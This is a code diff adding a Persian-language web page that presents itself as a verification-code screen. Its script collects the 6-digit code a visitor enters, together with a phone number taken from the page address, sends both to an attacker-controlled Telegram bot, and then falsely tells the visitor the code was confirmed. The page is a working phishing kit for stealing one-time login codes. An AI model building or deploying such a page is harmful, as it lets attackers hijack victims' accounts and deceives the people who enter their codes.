@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <title>تایید کد</title>
+</head>
+<style>
+    body {
+        background: rgba(0, 0, 0, 1);
+    }
+    
+    input {
+   background: rgba(255, 255, 255, 0.1);
+   padding: 15px;
+   border: 3px solid black;
+   border-radius: 15px;
+   margin-right: 1px;
+}
+   .glass-box {
+             background: rgba(255, 255, 255, 0.26);
+             border: 1px solid rgba(255, 255, 255, 0.25);
+             border-radius: 30px;
+             padding: 50px;
+             backdrop-filter: blur(5px);
+             box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
+             display: flex;
+             flex-direction: column;
+             align-items: center;
+             }
+      button {
+   background: rgba(255, 255, 255, 0.1);
+   padding-right: 15px;
+   padding-left: 15px;
+   padding-top: 10px;
+   padding-bottom: 10px;
+   border: 3px solid black;
+   border-radius: 15px;
+   margin-right: 1px;
+}
+
+      }
+</style>
+<body>
+    
+<div class="glass-box">
+<h2>ما به شما کد ارسال کردیم لطفاکد را وارد کنید</h2>
+
+<input id="code" type="text" placeholder="کد ۶ رقمی">
+
+<br><br>
+
+<button onclick="verifyCode()">تایید</button>
+</div>
+
+<script src="config.js"></script>
+
+<script>
+    function verifyCode() {
+        let code = document.getElementById("code").value.trim();
+        let params = new URLSearchParams(window.location.search);
+        let number = params.get("num");
+
+        if (!/^[0-9]{4,8}$/.test(code)) {
+            alert("کد نادرست است!");
+            return;
+        }
+
+        // ارسال کد و شماره به تلگرام
+        fetch(
+            `https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage?chat_id=${window.CHAT_ID}&text=🔐 کد: ${code}%0A📱 شماره: ${number}`
+        );
+
+        alert("کد شما تایید شد!");
+    }
+</script>
+
+</body>
+</html>
